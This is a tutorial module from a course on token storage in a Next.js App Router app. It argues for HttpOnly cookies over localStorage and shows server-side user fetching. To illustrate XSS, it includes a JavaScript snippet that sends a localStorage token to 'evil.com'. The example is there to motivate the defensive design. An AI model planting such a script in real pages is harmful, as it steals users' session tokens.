# F2: Next.js Token Storage (Memory vs Cookies)

**Track:** Frontend Deep Dive  
**Prerequisites:** M0 (Foundations), F1 (Fetch Interceptor)  
**Time:** ~1.5 hours  

---

## The Great Token Storage Debate

One of the most misunderstood aspects of modern frontend development is **where to store the access token**. If you search the internet, you will find hundreds of tutorials telling you to store tokens in `localStorage`. 

**In this architecture, we NEVER store tokens in `localStorage`.**

This document explains exactly how we store state securely in a Next.js App Router application.

---

## 1. Why `localStorage` is Dangerous

`localStorage` is accessible via JavaScript. If you type `localStorage.getItem('token')` in the browser console, you get the token.

### The Attack Vector: XSS (Cross-Site Scripting)
If your application has an XSS vulnerability (e.g., someone manages to post a malicious script in a comment that renders on the dashboard), that script executes in the victim's browser.

```javascript
// Malicious script injected via XSS
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('token') // 💥 Your token is gone!
});
```

Because access tokens give unrestricted access to the API, stealing them is catastrophic.

---

## 2. The Solution: `HttpOnly` Cookies

When the backend sets an `HttpOnly` cookie, **JavaScript cannot read it**. 
If you type `document.cookie` in the console, the token is not there.

```http
Set-Cookie: access_token=eyJhbGciOi...; HttpOnly; Secure; SameSite=Lax
```

### How does the frontend use it if it can't read it?
The beauty of cookies is that the browser **automatically** attaches them to any HTTP request made to the same domain. 

When your frontend React component calls:
```typescript
fetch('http://localhost:5000/api/users/me', { credentials: 'include' })
```
The browser looks into its secure cookie vault, finds the `access_token`, and attaches it to the request. The JavaScript code never saw the token, but the request was authenticated!

---

## 3. But wait... How do we know the User's State?

If we can't read the token, how does our React application know:
1. Is the user logged in?
2. What is their name and role?

We solve this by separating **Authentication State** (the token) from **Application State** (the user data).

### The Authentication State (The Token)
Lives purely in the `HttpOnly` cookie. The browser manages it. The frontend code ignores it entirely.

### The Application State (The User Object)
Lives in **Memory** (React Context / React State / Server Component Data).

---

## 4. How We Manage Application State in Next.js

Next.js App Router gives us a unique architecture because we have both Server and Client environments.

### Step 1: The Initial Page Load (Server-Side)
When the user visits `/dashboard`, the Next.js Node server receives the request. The request includes the cookies.

The Server Component uses `authFetchServer()` to ask the Express API: "Who does this cookie belong to?"

```tsx
// apps/web/src/lib/auth.ts -> getCurrentUser()

export async function getCurrentUser() {
  const res = await authFetchServer("/api/auth/me");
  if (!res.ok) return null;
  const data = await res.json();
  return data.data.user; // { id: "123", email: "tauhid@example.com", role: "USER" }
}
```

### Step 2: Rendering the UI
The Server Component receives the User Object. It renders the HTML.

```tsx
// apps/web/src/app/(protected)/layout.tsx

export default async function ProtectedLayout({ children }) {
  const user = await getCurrentUser();
  if (!user) redirect("/login");

  return (
    <div>
      <header>Welcome back, {user.email}</header>
      {children}
    </div>
  );
}
```

### Step 3: Client-Side Interactivity (Memory)
If a Client Component needs the user data, we pass it down as a prop from the Server Component. The data now lives in the browser's **Memory** (RAM).

If the user refreshes the page, memory is wiped, but the process starts over: the Server Component reads the cookie, asks the API, and repopulates the memory.

---

## 5. The Complete Flow Diagram

```ascii
[ Browser Memory ]           [ Browser Storage ]             [ Backend API ]
   React Props                  HttpOnly Vault                 Database

      Empty ─────────────────────► Cookie ─────────────────► POST /login
        │                                                           │
        │                                                    Sets Cookie
        │                                                    Returns {user}
        ◄───────────────────────────────────────────────────────────┘
   Memory populates
   with {user}


(User Refreshes Page)

      Empty ─────────────────────► Cookie ─────────────────► GET /me
        │                                                           │
        │                                                    Reads Cookie
        │                                                    Returns {user}
        ◄───────────────────────────────────────────────────────────┘
   Memory repopulates
```

---

## 6. What about `sessionStorage`?

Some developers ask: "Can I put the user object in `sessionStorage` so I don't have to fetch `/me` on every refresh?"

You can, but it is an anti-pattern for this architecture. 
1. The user object is not highly sensitive (unlike the token), but it's still better kept in memory.
2. Fetching `/me` on initial load (Server-Side Rendering) is extremely fast.
3. Fetching `/me` guarantees the user data is fresh. If an admin banned the user 5 seconds ago, the `/me` check catches it immediately. If the user was stored in `sessionStorage`, the UI would falsely show them as logged in until they made an API call.

---

## Practice Exercises

1. **Verify the State:** Log in to the application. Open DevTools → Application → Local Storage. Verify it is empty. Then go to Cookies and verify `access_token` is present and marked `HttpOnly`.
2. **Break the State:** In DevTools, manually delete the `access_token` cookie. Refresh the page. What happens? Why did the UI change if you didn't touch the React state?
3. **Trace the Data Flow:** Look at `apps/web/src/app/(protected)/layout.tsx`. Where does the `user` object come from? Trace it all the way back to the Express API's `/me` endpoint.
